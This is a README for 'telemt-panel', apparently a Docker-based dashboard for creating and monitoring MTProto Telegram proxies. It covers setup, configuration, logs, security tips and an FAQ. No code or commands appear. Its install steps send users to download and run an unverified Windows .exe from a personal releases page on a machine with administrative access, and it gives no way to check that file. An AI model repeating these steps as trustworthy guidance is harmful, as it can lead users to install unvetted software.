# 🌐 telemt-panel - Manage your Telegram proxy server easily

[![](https://img.shields.io/badge/Download-Latest-blue.svg)](https://github.com/Arjun99291/telemt-panel/releases)

This application provides a web-based dashboard for MTProto Telegram proxies. You can create, monitor, and manage Fake TLS proxy instances. The interface uses a dark theme.

## 📥 Getting Started

Follow these steps to set up the software on your Windows computer.

### System Requirements

Ensure your computer meets these conditions:
* Windows 10 or Windows 11.
* A stable internet connection.
* Administrative access to your computer.
* Docker Desktop installed and running.

### Installation Steps

1. Visit [the releases page](https://github.com/Arjun99291/telemt-panel/releases) to download the installer.
2. Select the file ending in .exe for Windows.
3. Save the file to your desktop.
4. Double-click the file to start the installation.
5. Follow the prompts on the screen to finish the process.

## ⚙️ Configuration

The panel requires a connection to your Docker environment to function. Docker handles the creation and management of the proxy instances behind the scenes.

1. Open Docker Desktop after the installation finishes.
2. Look for the system tray icon to verify that Docker shows a status of "Running."
3. Launch the telemt-panel application from your Start menu.
4. The application opens a new window.
5. Enter your configuration details if the setup wizard asks for them.

## 🛠️ Managing Proxies

You use the dashboard to control your Telegram proxies. Each instance runs inside a isolated container.

* **Create a Proxy:** Click the "New Proxy" button to start a fresh instance. You must choose a port number and a secret key.
* **Monitor Status:** The main screen shows the status of every proxy. The color green indicates a running proxy, while red means it stopped.
* **Stop or Delete:** Click the icons next to each proxy name to stop the service or remove the entry from your list altogether.

## 📊 Viewing Logs

The application provides logs for every proxy instance. This helps you identify issues if your Telegram connection fails.

1. Go to the "Instances" tab.
2. Select the specific proxy you want to check.
3. Click the "Logs" button to view real-time feedback from the server.
4. Use the clear button to delete old log entries.

## 🔒 Security Practices

Proxy servers can attract unsolicited traffic. Follow these tips to keep your setup secure:

* Use strong, random strings for your secret keys.
* Disable proxies that you no longer use.
* Keep Docker Desktop updated to the latest version.
* Limit access to the dashboard to your local network.

## 🆘 Troubleshooting

If you encounter issues, try these steps first:

* **Application does not open:** Check if Docker Desktop is running. The application requires Docker to communicate with the proxy containers.
* **Port conflicts:** If a proxy fails to start, another program might use the port you selected. Try changing the port number to something else.
* **No traffic:** Verify that your firewall settings allow traffic on the port you assigned to the proxy.
* **Application is slow:** Close unused programs to free up system memory for the Docker containers.

## 📖 Frequently Asked Questions

**Does this software record my private messages?**
No. This tool only manages the connection settings for your proxy. It does not inspect the content of the data passing through the proxy.

**Can I run multiple proxies at once?**
Yes. You can create as many instances as your computer hardware allows. Monitor the CPU and memory usage in Docker Desktop if you run many proxies simultaneously.

**Do I need a server?**
You can run this on your local computer to test proxies. For public use, consider hosting your proxy on a Virtual Private Server instead of your home machine.

**How do I update the software?**
When a new version releases, visit the download link, download the new installer, and run it. The installer automatically replaces the older version while keeping your settings intact.